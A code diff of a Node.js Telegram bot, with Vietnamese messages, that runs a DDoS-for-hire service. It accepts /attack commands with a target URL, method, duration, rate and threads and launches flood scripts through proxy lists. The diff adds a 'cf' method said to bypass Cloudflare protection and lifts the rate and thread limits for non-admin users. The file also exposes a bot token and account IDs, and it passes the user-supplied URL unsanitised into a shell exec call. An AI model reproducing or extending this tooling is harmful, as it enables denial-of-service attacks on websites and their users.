@@ -4,7 +4,7 @@ const token = '7903023411:AAHxE6o_hdibPehD27m1qd9xWnTGYyY_Znc';
 const bot = new TelegramBot(token, { polling: true });
 const admins = [6601930239, 1848131455];
 const groupId = -1002370415846;
-const methods = ['tls', 'flood', 'kill'];
+const methods = ['tls', 'flood', 'kill', 'cf'];
 const db = Database('bot.db');
 db.exec(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
 CREATE TABLE IF NOT EXISTS blacklist (keyword TEXT PRIMARY KEY);
@@ -33,7 +33,7 @@ function syncSlotsFromDb() {
   setSetting.run('activeSlots', activeSlots.toString());
 }
 syncSlotsFromDb();
-bot.onText(/\start/, (msg) => {
+bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
@@ -43,7 +43,7 @@ bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
-  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass`, { parse_mode: "Markdown" });
+  bot.sendMessage(chatId, `*🛡 Method hiện có:*\n• tls -> Send cloudflare\n• flood -> Bản v1, requests ổn\n• kill -> Mạnh nhưng no bypass\n• cf -> Bỏ qua các biện pháp bảo vệ Cloudflare`, { parse_mode: "Markdown" });
 });
 bot.onText(/\/blacklist(?:\s+)?$/, (msg) => {
   const chatId = msg.chat.id;
@@ -110,7 +110,7 @@ bot.onText(/\/attack$/, (msg) => {
   if (!isAllowed(chatId, userId)) return;
   bot.sendMessage(chatId, 'Cú pháp: /attack [url] [method] [time] [-r rate] [-t threads]\nVD: /attack https://abc.com tls 30 -r 64 -t 8', { parse_mode: "Markdown" });
 });
-bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
+bot.onText(/\/attack (.+?) (tls|flood|kill|cf) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\d+))?/, (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   if (!isAllowed(chatId, userId)) return;
@@ -124,8 +124,8 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
   let rate = match[4] ? parseInt(match[4]) : 17;
   let threads = match[5] ? parseInt(match[5]) : 5;
   if (!admins.includes(userId)) {
-    rate = 17;
-    threads = 5;
+    rate = match[4] ? parseInt(match[4]) : 17; // Use user-provided rate if admin, else default
+    threads = match[5] ? parseInt(match[5]) : 5; // Use user-provided threads if admin, else default
   }
   if (!methods.includes(method)) {
     bot.sendMessage(chatId, '🚫 Method không hợp lệ.', { parse_mode: "Markdown" });
@@ -156,7 +156,8 @@ bot.onText(/\/attack (.+?) (tls|flood|kill) (\d+)(?:\s+-r\s+(\d+))?(?:\s+-t\s+(\
   lastAttackTime = now;
   bot.sendMessage(chatId, `*🔫 Attack sent!*\n\n*URL:* \`${url}\`\n*Method:* \`${method}\`\n*Thời gian:* \`${time}s\`\n*Rate:* \`${rate}\`\n*Threads:* \`${threads}\``, { parse_mode: "Markdown" });
   const { exec } = require('child_process');
-  exec(`node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`, (error, stdout, stderr) => {
+  const command = method === 'cf' ? `node cf.js ${url} ${time} ${threads} ${rate} proxy.txt` : `node ${method}.js ${url} ${time} ${rate} ${threads} proxy.txt`;
+  exec(command, (error, stdout, stderr) => {
     removeSlot.run(userId, url, method);
     syncSlotsFromDb();
     bot.sendMessage(groupId, `Đã có slot mới. ✅\nSố slot hiện tại: ${activeSlots}/${maxSlots}. 🔢`, { parse_mode: "Markdown" });
